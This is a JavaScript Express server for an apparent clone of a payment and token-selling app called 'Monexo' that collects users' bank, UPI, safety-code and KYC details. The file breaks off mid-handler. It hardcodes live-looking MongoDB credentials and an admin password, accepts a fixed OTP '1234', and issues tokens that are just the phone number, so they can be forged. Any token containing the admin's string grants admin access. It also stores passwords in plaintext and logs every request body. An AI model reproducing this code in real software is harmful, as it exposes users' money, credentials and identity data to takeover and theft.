// @ts-nocheck
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import mongoose from 'mongoose';
import multer from 'multer';
import fs from 'fs';

let currentDirname = process.cwd();
try {
  // @ts-ignore
  currentDirname = path.dirname(fileURLToPath(import.meta.url));
} catch (e) {
  // @ts-ignore
  currentDirname = __dirname;
}

const app = express();
const PORT = 3000;

const upload = multer();

// Enable JSON and URL-encoded parsing with generous limits
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));
app.use(upload.any());

// Gracefully handle multer errors (e.g. Multipart: Boundary not found)
app.use((err, req, res, next) => {
  if (err) {
    console.error('[Multer / BodyParser Error Handler]', err.message);
    if (err.message && err.message.includes('Boundary not found')) {
      // Skip the error and let express parse the body via urlencoded/json
      return next();
    }
    return res.json({ code: 400, msg: err.message });
  }
  next();
});

// MongoDB Connection
const MONGO_URI = 'mongodb+srv://Ritik:Ritik906087@tdm.uwkxmdo.mongodb.net/TDM?retryWrites=true&w=majority';
console.log('Connecting to MongoDB...');
mongoose.connect(MONGO_URI)
  .then(() => console.log('Successfully connected to MongoDB.'))
  .catch((err) => console.error('Error connecting to MongoDB:', err));

// Mongoose Schemas
const userSchema = new mongoose.Schema({
  phone: { type: String, sparse: true, index: true },
  mobileNo: { type: String, sparse: true, index: true },
  email: { type: String },
  fullName: { type: String },
  password: { type: String },
  repassword: { type: String },
  invitercode: { type: String },
  safetyCode: { type: String },
  bankDetails: { type: Array, default: [] },
  upiDetails: { type: Array, default: [] },
  utrLogs: { type: Array, default: [] },
  balance: { type: Number, default: 10000 },
  commission: { type: Number, default: 120 },
  recharge: { type: Number, default: 0 },
  vipLevel: { type: Number, default: 1 },
  kycStatus: { type: Number, default: 0 },
  realName: { type: String, default: '' },
  parentUser: { type: String, default: '' },
  todayProfit: { type: Number, default: 0 },
  trc20Address: { type: String, default: '' },
  net: { type: String, default: '' },
  pageSize: { type: Number, default: 10 },
  totalTransferValue: { type: Number, default: 0 },
  collectionTools: { type: Array, default: null },
  token: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const logSchema = new mongoose.Schema({
  endpoint: String,
  method: String,
  headers: mongoose.Schema.Types.Mixed,
  body: mongoose.Schema.Types.Mixed,
  query: mongoose.Schema.Types.Mixed,
  ip: String,
  timestamp: { type: Date, default: Date.now }
});

const transactionSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  phone: String,
  rptNo: { type: String, unique: true },
  amount: Number,
  utr: { type: String, default: '' },
  currentStep: { type: Number, default: 0 }, // 0: unpaid/instructions, 1: upload cert, 2: reviewed/success
  payee_recipients_name: { type: String, default: 'Monexo Merchant' },
  payee_ifsc: { type: String, default: 'SBIN0001234' },
  payee_bank_account: { type: String, default: '918273645019' },
  payee_bankname: { type: String, default: 'State Bank of India' },
  payment_method: { type: Number, default: 0 }, // 0: bank, 1: upi
  payer_status: { type: Number, default: 2 }, // 2: pending, 1: paying, 3: success, 4: cancel, 5: timeout
  confirm_mode: { type: Number, default: 0 }, // 0: auto, 1: certify
  countdown: { type: Number, default: 1800 },
  reason_for_rejection: { type: String, default: '' },
  ctime: { type: Number, default: () => Math.floor(Date.now() / 1000) },
  type: { type: String, default: 'recharge' } // 'recharge' or 'sell'
});

const User = mongoose.model('User', userSchema);
const GeneralLog = mongoose.model('GeneralLog', logSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);

async function seedAdminUser() {
  try {
    const adminPhone = '7870873927';
    let admin = await User.findOne({ $or: [{ phone: adminPhone }, { mobileNo: adminPhone }] });
    if (!admin) {
      admin = new User({
        phone: adminPhone,
        mobileNo: adminPhone,
        password: 'Ritik@123',
        repassword: 'Ritik@123',
        balance: 100000,
        vipLevel: 5,
        kycStatus: 1,
        realName: 'Ritik Admin'
      });
      await admin.save();
      console.log('[Seeding] Created Admin user 7870873927 successfully.');
    } else {
      admin.password = 'Ritik@123';
      await admin.save();
    }
  } catch (err) {
    console.error('Error seeding admin user:', err);
  }
}
seedAdminUser();

function isPasswordEmpty(password) {
  if (password === undefined || password === null) return true;
  const p = String(password).trim();
  return p === '' || p === 'undefined' || p === 'null';
}

function getDefaultCollectionTools() {
  return [
    {
      id: "tool-paytm-business",
      name: "PayTM Business",
      type: 16,
      onlyPaymentFlag: 3,
      state: 2, // idle / online
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "If you Change your upi id, please relink right now!",
      account: "merchant@paytm",
      phone: "9182736450",
      remark: "Verified merchant partner"
    },
    {
      id: "tool-phonepe-business",
      name: "PhonePe Business",
      type: 19,
      onlyPaymentFlag: 3,
      state: 2,
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "Please check upi address before transfer",
      account: "merchant@ybl",
      phone: "9876543210",
      remark: "Instant settlement"
    },
    {
      id: "tool-amazon",
      name: "Amazon Pay",
      type: 18,
      onlyPaymentFlag: 3,
      state: 2,
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "Ensure your account status is active",
      account: "merchant@apl",
      phone: "9000100020",
      remark: "Super-fast settlement"
    }
  ];
}

// CORS configuration helper
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE, PATCH');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept, X-Requested-With, INDIATOKEN, token');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Middleware to capture and log ALL API requests to MongoDB
app.use('/xxapi', async (req, res, next) => {
  try {
    const log = new GeneralLog({
      endpoint: req.originalUrl,
      method: req.method,
      headers: req.headers,
      body: req.body,
      query: req.query,
      ip: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress
    });
    await log.save();
    console.log(`[API Log] Saved request to ${req.originalUrl}`);
  } catch (err) {
    console.error('Error saving API log to MongoDB:', err);
  }
  next();
});

// Helper function to find user by header token
async function getUserByToken(req) {
  let token = req.headers['indiatoken'] || req.headers['token'] || req.headers['INDIATOKEN'] || req.query?.token || req.query?.indiatoken;
  if (!token) return null;
  
  // If token is comma-separated due to proxy aggregation, clean and extract the correct token part
  if (typeof token === 'string') {
    if (token.includes(',')) {
      const parts = token.split(',').map(t => t.trim()).filter(Boolean);
      // Prefer a token starting with "token-" or just take the first one
      token = parts.find(p => p.startsWith('token-')) || parts[0];
    }
  }

  if (!token) return null;

  if (token === 'token-7870873927' || token.includes('token-7870873927')) {
    return await User.findOne({ $or: [{ phone: '7870873927' }, { mobileNo: '7870873927' }] });
  }
  return await User.findOne({ token });
}

// 1. REGISTER ENDPOINT
app.post('/xxapi/register', async (req, res) => {
  try {
    const { phone, password, repassword, smscode } = req.body;
    const invitercode = req.body.invitercode || req.body.referral_code || '';
    if (!phone || String(phone).trim() === '') {
      return res.json({ code: 400, msg: 'Phone number is required' });
    }
    if (isPasswordEmpty(password)) {
      return res.json({ code: 400, msg: 'Password cannot be empty' });
    }
    if (!smscode || String(smscode).trim() !== '1234') {
      return res.json({ code: 400, msg: 'Incorrect OTP. Please enter 1234.' });
    }

    const token = `token-${phone}`;
    let user = await User.findOne({ $or: [{ phone }, { mobileNo: phone }] });

    if (user) {
      return res.json({ code: 400, msg: 'Phone number is already registered. Please login.' });
    }

    user = new User({
      phone,
      mobileNo: phone, // Store in both fields for cross-system script compatibility
      password,
      repassword: repassword || password,
      invitercode: invitercode || '',
      token,
      balance: 10000,
      commission: 120,
      collectionTools: getDefaultCollectionTools()
    });
    await user.save();

    console.log(`[Register] User ${phone} registered successfully with valid OTP 1234.`);
    return res.json({
      code: 0,
      msg: 'success',
      data: token
    });
  } catch (err) {
    console.error('Registration Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// SMS and Registration flow helpers
app.post('/xxapi/checkSmsNew', async (req, res) => {
  console.log('[checkSmsNew] Called', req.body);
  const { phone, password } = req.body;
  if (!phone || String(phone).trim() === '') {
    return res.json({ code: 400, msg: 'Phone number is required' });
  }
  if (isPasswordEmpty(password)) {
    return res.json({ code: 400, msg: 'Password cannot be empty' });
  }

  // To allow Login button to show the OTP captcha dialog,
  // checkSmsNew must return success code: 0 even if user already exists in DB.
  console.log(`[checkSmsNew] Success. Temporary OTP 1234 generated for phone: ${phone}`);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.post('/xxapi/resetpassword', async (req, res) => {
  console.log('[resetpassword] Called', req.body);
  try {
    const { phone, password, sendtoken, smscode } = req.body;
    if (!phone || String(phone).trim() === '') {
      return res.json({ code: 400, msg: 'Phone number is required' });
    }
    if (isPasswordEmpty(password)) {
      return res.json({ code: 400, msg: 'Password cannot be empty' });
    }
    if (!smscode || String(smscode).trim() !== '1234') {
      return res.json({ code: 400, msg: 'Incorrect OTP. Please enter 1234.' });
    }

    const user = await User.findOne({ $or: [{ phone }, { mobileNo: phone }] });
    if (!user) {
      return res.json({ code: 400, msg: 'User does not exist. Please register first.' });
    }

    user.password = password;
    user.repassword = password;
    await user.save();
    console.log(`[ResetPassword] User ${phone} reset password successfully.`);

    return res.json({
      code: 0,
      msg: 'success'
    });
  } catch (err) {
    console.error('Reset Password Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.post('/xxapi/getsendtken', async (req, res) => {
  console.log('[getsendtken] Called', req.body);
  const phone = req.body.phone || 'default';
  return res.json({
    code: 0,
    msg: 'success',
    data: `sendtoken-${phone}-${Date.now()}`
  });
});

app.post('/xxapi/sendLoginSms', async (req, res) => {
  console.log('[sendLoginSms] Called', req.body);
  const { phone, password } = req.body;
  if (!phone || String(phone).trim() === '') {
    return res.json({ code: 400, msg: 'Phone number is required' });
  }
  if (isPasswordEmpty(password)) {
    return res.json({ code: 400, msg: 'Password cannot be empty' });
  }

  // Check if user is registered in the database (via either phone or mobileNo)
  const registeredUser = await User.findOne({ $or: [{ phone }, { mobileNo: phone }] });
  if (!registeredUser) {
    return res.json({ code: 400, msg: 'User does not exist. Please register first.' });
  }

  console.log(`[OTP Sent] Temporary OTP 1234 generated for login of phone: ${phone}`);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.post('/xxapi/sendsms', async (req, res) => {
  console.log('[sendsms] Called', req.body);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.get('/xxapi/sliderCaptcha', async (req, res) => {
  console.log('[sliderCaptcha] Called');
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

// 2. LOGIN ENDPOINT
app.post('/xxapi/login', async (req, res) => {
  try {
    const { phone, password, smscode } = req.body;
    if (!phone || String(phone).trim() === '') {
      return res.json({ code: 400, msg: 'Phone number is required' });
    }
    if (isPasswordEmpty(password)) {
      return res.json({ code: 400, msg: 'Password cannot be empty' });
    }
    if (!smscode || String(smscode).trim() !== '1234') {
      return res.json({ code: 400, msg: 'Incorrect OTP. Please enter 1234.' });
    }

    const token = `token-${phone}`;
    let user = await User.findOne({ $or: [{ phone }, { mobileNo: phone }] });

    if (!user) {
      return res.json({ code: 400, msg: 'User does not exist. Please register first.' });
    }

    if (user.password !== password) {
      return res.json({ code: 400, msg: 'Incorrect password' });
    }

    user.token = token;
    await user.save();
    console.log(`[Login] User ${phone} logged in successfully.`);

    return res.json({
      code: 0,
      msg: 'success',
      data: token
    });
  } catch (err) {
    console.error('Login Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 3. USERINFO ENDPOINT
app.get('/xxapi/userinfo', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({
        code: 403,
        msg: 'Unauthorized'
      });
    }

    return res.json({
      code: 0,
      msg: 'success',
      data: {
        uid: user._id,
        id: user._id,
        username: user.phone || user.mobileNo || '',
        phone: user.phone || user.mobileNo || '',
        teamWorkId: user.phone || user.mobileNo || '',
        balance: user.balance ?? 10000,
        commission: user.commission ?? 120,
        withdrawable: user.balance ?? 10000,
        recharge: user.recharge ?? 0,
        vipLevel: user.vipLevel ?? 1,
        invitercode: user.invitercode || '123456',
        safetyCodeSet: !!user.safetyCode,
        bankCount: user.bankDetails ? user.bankDetails.length : 0,
        upiCount: user.upiDetails ? user.upiDetails.length : 0,
        kycStatus: user.kycStatus ?? 0,
        realName: user.realName || user.fullName || '',
        parentUser: user.parentUser || '',
        todayProfit: user.todayProfit ?? 0,
        trc20Address: user.trc20Address || '',
        net: user.net || '',
        pageSize: user.pageSize || 10,
        totalTransferValue: user.totalTransferValue || 0,
        itoken: user.balance ?? 10000,
        frozenItoken: 0
      }
    });
  } catch (err) {
    console.error('Userinfo Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 4. BANK ENDPOINTS
app.post('/xxapi/bank', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const bankData = req.body;
    if (!user.bankDetails) user.bankDetails = [];
    user.bankDetails.push(bankData);
    user.markModified('bankDetails');
    await user.save();

    console.log(`[Bank] Added bank details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Bank Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.post('/xxapi/bank/edit', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const bankData = req.body;
    user.bankDetails = [bankData];
    user.markModified('bankDetails');
    await user.save();

    console.log(`[Bank] Edited bank details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Bank Edit Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.get('/xxapi/bank', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    return res.json({
      code: 0,
      msg: 'success',
      data: user ? (user.bankDetails || []) : []
    });
  } catch (err) {
    console.error('Get Bank List Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.post('/xxapi/bank/pause', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/bank/active', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/availablebank', async (req, res) => {
  const user = await getUserByToken(req);
  return res.json({
    code: 0,
    msg: 'success',
    data: user ? (user.bankDetails || []) : []
  });
});

// 5. UPI ENDPOINTS
app.post('/xxapi/authupi', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const { ctid, utr } = req.body;
    
    // Set the state of collection tool with matching id to active
    if (!user.collectionTools) {
      user.collectionTools = getDefaultCollectionTools();
    }
    
    const tool = user.collectionTools.find(t => t.id === ctid);
    if (tool) {
      tool.state = 2; // Idle / online
      tool.inSell = 1; // Active in sell
    }
    
    if (!user.upiDetails) user.upiDetails = [];
    user.upiDetails.push({ ctid, utr, date: new Date() });
    
    user.markModified('collectionTools');
    user.markModified('upiDetails');
    await user.save();

    console.log(`[UPI] Authenticated UPI details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Auth UPI Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.get('/xxapi/upidetail/:id', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: {} });
});

// 6. SAFETY CODE ENDPOINT
app.post('/xxapi/safety_code', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const code = req.body.safety_code || req.body.code || req.body.safetyCode;
    user.safetyCode = code;
    await user.save();

    console.log(`[Safety Code] Saved safety code for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Safety Code Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 7. KYC ENDPOINTS
app.get('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  return res.json({
    code: 0,
    msg: "success",
    data: user.kycDetails || {
      realName: user.realName || '',
      idCard: '',
      status: user.kycStatus ?? 0,
      rejectReason: ''
    }
  });
});

app.post('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  user.kycDetails = req.body;
  user.realName = req.body.realName || req.body.name || user.realName;
  user.kycStatus = 1; // Submitted / Approved (we can instantly approve for premium UX!)
  user.markModified('kycDetails');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.patch('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  user.kycDetails = { ...(user.kycDetails || {}), ...req.body };
  user.realName = req.body.realName || req.body.name || user.realName;
  user.kycStatus = 1;
  user.markModified('kycDetails');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

// 8. CONFIG ENDPOINTS (No live vercel fetch - completely isolated local data)
app.get('/xxapi/config', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      usdtExchangerate: "80",
      currency: "INR",
      registerHost: "https://refer.vantage.top/#/rs/",
      tgChannelLink: "xxxx",
      rewardRules: {
        freeze_comp_reward: { name: "freeze_comp_reward", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 0, rule: "{}" },
        inr_buy_dividend: { name: "inr_buy_dividend", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 1, rule: "{\"1\": 0.003, \"2\": 0.002, \"3\": 0.001}" },
        inr_buy_reward: { name: "inr_buy_reward", fixed: 0, ratio: 2.5, minCondi: 1, ruleActive: 0, rule: "{\"rate_change\": \"2.0,2.5\", \"fixed_change\": \"0,0\"}" },
        inr_buy_reward_0: { name: "inr_buy_reward_0", fixed: 0, ratio: 2.5, minCondi: 0, ruleActive: 1, rule: "{\"rate_change\": \"2.0,2.5\", \"fixed_change\": \"0,0\"}" },
        today_buy_times_reward: { name: "today_buy_times_reward", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 1, rule: "{\"1\": 10, \"3\": 20, \"5\": 20, \"10\": 50}" },
        usdt_buy_dividend: { name: "usdt_buy_dividend", fixed: 0, ratio: 0, minCondi: 100, ruleActive: 1, rule: "{\"1\": 0.003, \"2\": 0.001, \"3\": 0.0}" }
      },
      bannerSrcs: [
        "https://picsum.photos/seed/1/800/400",
        "https://picsum.photos/seed/2/800/400",
        "https://picsum.photos/seed/3/800/400"
      ],
      newsList: [
        { id: 32, cover: "", name: "securityupdate", code: "", type: 1, content: "Update verified", crtDate: 1779259339, crtUser: "alan", sort: 4 }
      ],
      pinFlag: false,
      ctTypes: [16, 1, 17, 2, 18, 3, 19, 4, 7, 9],
      ctTypesPayType: { "1": 2, "2": 2, "3": 1, "4": 2, "7": 3, "9": 2, "16": 2, "17": 2, "18": 1, "19": 2 },
      ifFinishNewbieActivity: 0,
      rptPaymentMode: 1,
      webLicenseId: "19711455",
      userBalShowReal: 0,
      sevenDayBuyEnabled: 0,
      v: 2039,
      pv: 3
    }
  });
});

app.post('/xxapi/client_error', (req, res) => {
  console.log('--- CLIENT ERROR RECEIVED ---');
  console.log('Message:', req.body.message);
  console.log('Filename:', req.body.filename);
  console.log('Line:', req.body.lineno, 'Col:', req.body.colno);
  console.log('Stack:', req.body.stack);
  console.log('-----------------------------');
  return res.json({ code: 0, msg: 'logged' });
});

app.get('/xxapi/simpConfig', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      siteName: "Monexo",
      logo: "favicon.ico",
      customerServiceUrl: "https://t.me/xxxx",
      okTurnstileSitekey: "0",
      payerTimeoutTime: 600
    }
  });
});

// Newbie, Activity and Rewards fallback/stub API endpoints to prevent SPA router HTML fallbacks
app.get('/xxapi/newbieDayStep/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false,
      buyToken: "0"
    }
  });
});

app.get('/xxapi/newbieStepTotal/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      newbieStepRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false,
      finishNewbie: 1
    }
  });
});

app.get('/xxapi/inviteNewbieStepTotal/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      inviteDayStepRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      oldRptNewReward: { fixed: 0 },
      dayStepParams: "{}",
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/newbieDayStep/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/inviteDayStep/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/inviteDayStep/reward/:id', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/buyInrTimes/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/buyInrTimes/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/buyInrAmount/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/buyInrAmount/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/sellInrAmount/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/sellInrAmount/reward/:id/:amount', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/freezeComp/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: 0, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/freezeComp/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/bguide/activityCodeDone/:code', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.post('/xxapi/bguide/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/todayLotteryReward/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      activityRecord: { done: false, condition: 0, settleAmt: 0, params: "{}" },
      activityRules: [],
      allDone: false
    }
  });
});

app.post('/xxapi/todayLotteryReward/claim', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/dailyFreeLottery/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      status: 0,
      rewards: []
    }
  });
});

app.post('/xxapi/dailyFreeLottery/spin', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/sevenDayBuy/init', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      list: []
    }
  });
});

app.post('/xxapi/sevenDayBuy/reward', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

// Additional API stubs to ensure all possible external/client routes do not fall back to HTML
app.post('/xxapi/tgbotbindtoken', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/tgbotbindtoken', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: {} });
});

app.get('/xxapi/upidetail/:upi', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: {} });
});

app.get('/xxapi/teamDailyData/:id', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: [] });
});

app.get('/xxapi/minSellIToken/:id/:amount', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: {} });
});

app.get('/xxapi/minMaxUpiSell/:id/:amount/:something', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: {} });
});

app.post('/xxapi/checkSmsNew', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/buyUsdt/list', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: [] });
});

app.post('/xxapi/wallet/sendVerifySms/:id/:other', async (req, res) => {
  return res.json({ code: 0, msg: "success" });
});

app.get('/xxapi/bank/history', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: [] });
});

app.get('/xxapi/TgBindUserservice', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: [] });
});

app.get('/xxapi/checkTgBindStatus', async (req, res) => {
  return res.json({ code: 0, msg: "success", data: { bound: false } });
});

app.get('/xxapi/buyitoken/waitconfirm', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: {
      waitconfirm: []
    }
  });
});

app.get('/xxapi/buyitoken/history', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: {
      total: 0,
      list: []
    }
  });
});

app.get('/xxapi/buyitoken/waitpayerpaymentslip', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: {
      total: 0,
      list: []
    }
  });
});

app.get('/xxapi/buyitoken/paymentslipdetail', async (req, res) => {
  const id = req.query.id || 'TXN' + Math.floor(100000 + Math.random() * 900000);
  const amount = req.query.amount || '500';
  return res.json({
    code: 0,
    msg: 'success',
    data: {
      id: id,
      orderid: id,
      amount: amount,
      payee_bankname: "State Bank of India",
      payment_method: "bank",
      payee_recipients_name: "Admin",
      payee_ifsc: "SBIN0001234",
      payee_bank_account: "9876543210",
      reason_for_rejection: "",
      payer_status: 1,
      confirm_mode: 0,
      ctType: 1,
      ct_type: 1,
      countdown: 600,
      ctime: req.query.ctime || Date.now(),
      walletDomain: "https://example.com"
    }
  });
});

app.get('/xxapi/buyitoken/check', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: {
      cnt: 1,
      chargeFlag: 0,
      chargeAmt: '0'
    }
  });
});

app.get('/xxapi/customerservice', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: [
      {
        nickname: "Telegram Customer Service",
        label: "@MonexoSupport",
        type: "service",
        url: "https://t.me/xxxx"
      },
      {
        nickname: "Official Channel",
        label: "Monexo Announcements",
        type: "customer",
        url: "https://t.me/xxxx"
      }
    ]
  });
});

app.get('/xxapi/addAgentGroup/:id', async (req, res) => {
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

// 9. COLLECTION TOOL ENDPOINTS
app.get('/xxapi/collectiontoollist', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools });
});

app.get('/xxapi/collectiontool', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools[0] });
});

app.post('/xxapi/collectiontoolStatus', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id, inSell, state } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    if (inSell !== undefined) tool.inSell = Number(inSell);
    if (state !== undefined) tool.state = Number(state);
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/collectiontool/startsell', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    tool.inSell = 1;
    tool.state = 2; // idle / active
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/collectiontool/stopsell', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    tool.inSell = 0;
    tool.state = 0; // disabled
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/availablect', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 0, msg: 'success', data: [] });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools });
});

// 10. RECHARGE, DEPOSIT AND TRANSACTION ENDPOINTS
app.all('/xxapi/rechargeConfirm', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  
  const amount = Number(req.body.amount || req.query.amount || 1000);
  const rptNo = `RPT${Date.now()}`;
  
  const tx = new Transaction({
    userId: user._id,
    phone: user.phone,
    rptNo: rptNo,
    amount: amount,
    type: 'recharge',
